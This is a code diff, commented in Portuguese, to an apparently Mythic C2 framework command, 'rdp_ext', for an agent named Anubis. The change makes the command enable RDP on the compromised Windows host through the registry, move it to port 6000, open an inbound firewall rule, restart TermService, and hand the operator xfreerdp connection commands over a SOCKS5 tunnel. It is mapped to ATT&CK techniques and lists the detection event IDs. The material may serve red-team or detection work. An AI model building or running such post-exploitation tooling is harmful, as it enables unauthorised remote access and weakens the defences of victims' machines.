@@ -10,21 +10,25 @@ class RdpExtArguments(TaskArguments):
             CommandParameter(
                 name="target",
                 type=ParameterType.String,
-                parameter_group_info=[ParameterGroupInfo(required=True)],
-                description="IP ou hostname do host com RDP (deve ser alcançável pelo agente).",
+                parameter_group_info=[ParameterGroupInfo(required=False)],
+                description=(
+                    "IP do alvo RDP (deve ser alcançável pelo agente). "
+                    "Vazio = usa o IP local do próprio agente."
+                ),
+                default_value="",
             ),
             CommandParameter(
                 name="port",
                 type=ParameterType.Number,
                 parameter_group_info=[ParameterGroupInfo(required=False)],
-                description="Porta RDP no alvo.",
-                default_value=3389,
+                description="Nova porta RDP a configurar no host do agente. Padrão: 6000.",
+                default_value=6000,
             ),
             CommandParameter(
                 name="username",
                 type=ParameterType.String,
                 parameter_group_info=[ParameterGroupInfo(required=False)],
-                description="Usuário RDP.",
+                description="Usuário RDP para os comandos de conexão.",
                 default_value="",
             ),
             CommandParameter(
@@ -45,10 +49,7 @@ class RdpExtArguments(TaskArguments):
                 name="socks_port",
                 type=ParameterType.Number,
                 parameter_group_info=[ParameterGroupInfo(required=False)],
-                description=(
-                    "Porta SOCKS5 a abrir no servidor Mythic. "
-                    "Padrão: 7005. Se já estiver rodando na mesma porta, o aviso é seguro."
-                ),
+                description="Porta SOCKS5 a abrir no servidor Mythic. Padrão: 7005.",
                 default_value=7005,
             ),
         ]
@@ -58,56 +59,55 @@ class RdpExtArguments(TaskArguments):
             if self.command_line.strip().startswith('{'):
                 d = json.loads(self.command_line)
                 self.add_arg("target",     d.get("target",     ""))
-                self.add_arg("port",       d.get("port",       3389))
+                self.add_arg("port",       d.get("port",       6000))
                 self.add_arg("username",   d.get("username",   ""))
                 self.add_arg("password",   d.get("password",   ""))
                 self.add_arg("domain",     d.get("domain",     ""))
                 self.add_arg("socks_port", d.get("socks_port", 7005))
             else:
-                # Posicional: <target> [user] [password] [domain] [socks_port]
+                # Posicional: [target] [user] [password] [domain]
                 parts = self.command_line.strip().split()
                 self.add_arg("target",     parts[0] if len(parts) > 0 else "")
                 self.add_arg("username",   parts[1] if len(parts) > 1 else "")
                 self.add_arg("password",   parts[2] if len(parts) > 2 else "")
                 self.add_arg("domain",     parts[3] if len(parts) > 3 else "")
-                self.add_arg("port",       3389)
+                self.add_arg("port",       6000)
                 self.add_arg("socks_port", 7005)
         else:
-            for k, v in [("target",""),("port",3389),("username",""),
-                         ("password",""),("domain",""),("socks_port",7005)]:
+            for k, v in [("target",""), ("port",6000), ("username",""),
+                         ("password",""), ("domain",""), ("socks_port",7005)]:
                 self.add_arg(k, v)
 
 
 class RdpExtCommand(CommandBase):
     cmd         = "rdp_ext"
     needs_admin = False
-    help_cmd    = "rdp_ext <target> [username] [password] [domain]"
+    help_cmd    = "rdp_ext [target_ip] [username] [password] [domain]"
     description = (
-        "Acesso RDP via tunnel SOCKS5 do Anubis — sem Python no host operador.\n\n"
-        "Fluxo:\n"
-        "  1. Mythic abre porta SOCKS5 no servidor Mythic (padrão: 7005)\n"
-        "  2. Agente faz probe TCP em target:3389 para confirmar alcançabilidade\n"
-        "  3. Retorna comandos prontos: rdesktop, xfreerdp via proxychains,\n"
-        "     e xfreerdp com suporte nativo a SOCKS5 (/proxy:socks5://...)\n\n"
-        "O xfreerdp nativo é o método preferido (sem dependência de proxychains):\n"
-        "  xfreerdp /proxy:socks5://127.0.0.1:7005 /v:<target> /u:<user> ...\n\n"
-        "Pré-requisito no host operador (Kali):\n"
-        "  apt install freerdp2-x11   # xfreerdp\n"
-        "  apt install rdesktop        # alternativa\n"
-        "  apt install proxychains-ng  # se preferir proxychains"
+        "Configura e ativa acesso RDP no host do agente via tunnel SOCKS5 (T1021.001/T1090).\n\n"
+        "Execução no agente (Windows):\n"
+        "  1. Habilita RDP: HKLM\\...\\Terminal Server\\fDenyTSConnections = 0\n"
+        "  2. Muda porta: HKLM\\...\\RDP-Tcp\\PortNumber = 6000\n"
+        "  3. Firewall: netsh advfirewall add rule TCP/6000 inbound\n"
+        "  4. Reinicia TermService via ctypes SCM (sem sc.exe)\n"
+        "  5. TCP probe em target:6000 → confirma RDP ativo\n"
+        "  6. Retorna comandos xfreerdp/rdesktop prontos via SOCKS5\n\n"
+        "Se target não for informado, usa o IP local do próprio agente.\n\n"
+        "Pré-requisito no operador (Kali):\n"
+        "  apt install freerdp2-x11   # xfreerdp (recomendado — SOCKS5 nativo)\n"
+        "  apt install rdesktop        # alternativa\n\n"
+        "Detecção no alvo:\n"
+        "  EID 4946 (Firewall rule added), EID 7036 (TermService restart),\n"
+        "  EID 4624 Logon Type 10 (se autenticação RDP bem-sucedida)"
     )
     version               = 1
     author                = "@wtechsec"
-    attackmapping         = ["T1021.001", "T1090"]
+    attackmapping         = ["T1021.001", "T1090", "T1562.004"]
     supported_ui_features = []
     argument_class        = RdpExtArguments
     attributes            = CommandAttributes(
         supported_python_versions=["Python 3.8"],
-        supported_os=[
-            SupportedOS.Windows,
-            SupportedOS.Linux,
-            SupportedOS.MacOS,
-        ],
+        supported_os=[SupportedOS.Windows],
     )
 
     async def create_go_tasking(
@@ -118,35 +118,33 @@ class RdpExtCommand(CommandBase):
             Success=True,
         )
 
-        target     = taskData.args.get_arg("target")     or ""
+        target     = taskData.args.get_arg("target")     or "(auto)"
         username   = taskData.args.get_arg("username")   or ""
         domain     = taskData.args.get_arg("domain")     or ""
-        port       = taskData.args.get_arg("port")       or 3389
+        port       = taskData.args.get_arg("port")       or 6000
         socks_port = taskData.args.get_arg("socks_port") or 7005
 
-        # ── inicia SOCKS5 no servidor Mythic via RPC ──────────────────────────
+        # ── Inicia SOCKS5 no servidor Mythic ──────────────────────────────────
         socks_resp = await SendMythicRPCProxyStartCommand(MythicRPCProxyStartMessage(
             TaskID=taskData.Task.ID,
             PortType="socks",
             LocalPort=socks_port,
         ))
         if not socks_resp.Success:
-            # Pode falhar se já estiver rodando — é seguro continuar
             await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                 TaskID=taskData.Task.ID,
-                Response=(
-                    "[*] SOCKS5 aviso (pode já estar ativo): {}\n".format(socks_resp.Error)
-                ).encode()
+                Response="[*] SOCKS5 nota (pode já estar ativo): {}\n".format(
+                    socks_resp.Error).encode()
             ))
 
-        # ── display_params ────────────────────────────────────────────────────
+        # ── display_params ─────────────────────────────────────────────────────
         user_str = ""
         if domain and username:
             user_str = " {}\\{}".format(domain, username)
         elif username:
             user_str = " {}".format(username)
 
-        response.DisplayParams = "target={}:{}{} socks={}".format(
+        response.DisplayParams = "target={} rdp_port={}{} socks={}".format(
             target, port, user_str, socks_port)
         return response
 
